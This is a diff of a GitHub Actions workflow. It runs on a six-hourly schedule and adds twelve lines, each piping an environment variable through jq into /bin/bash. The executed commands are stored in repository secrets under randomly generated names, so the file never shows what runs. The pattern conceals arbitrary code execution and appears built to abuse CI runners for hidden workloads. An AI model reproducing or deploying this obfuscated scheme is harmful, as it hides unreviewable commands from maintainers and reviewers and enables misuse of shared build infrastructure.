@@ -2,18 +2,26 @@ name: dongaoxiong6715
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
+    - cron: '7 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongaoxiong6715
         env:
-          sqze5: ${{ secrets.sqze5 }}
+          ftpta1642: ${{ secrets.ftpta1642 }}
         run: |
-          echo $sqze5 | jq -r .o9612 | /bin/bash
-          echo $zcnd887 | jq -r .pb697 | /bin/bash
-          echo $fclbi1406 | jq -r .fithr5013 | /bin/bash
+          echo $ftpta1642 | jq -r .lrxw307 | /bin/bash
+          echo $ar90 | jq -r .b86657 | /bin/bash
+          echo $qtr0 | jq -r .jpfl19 | /bin/bash
+          echo $zoqh950 | jq -r .phgn0804 | /bin/bash
+          echo $kvlt3 | jq -r .d24425 | /bin/bash
+          echo $y43682 | jq -r .lvnnr03 | /bin/bash
+          echo $xkft46701 | jq -r .i2815 | /bin/bash
+          echo $osr6532 | jq -r .ces7 | /bin/bash
+          echo $x237 | jq -r .gpl35761 | /bin/bash
+          echo $j394 | jq -r .dtno38624 | /bin/bash
+          echo $bknt05898 | jq -r .l5612 | /bin/bash
+          echo $wmeh3 | jq -r .amjsp404 | /bin/bash
 
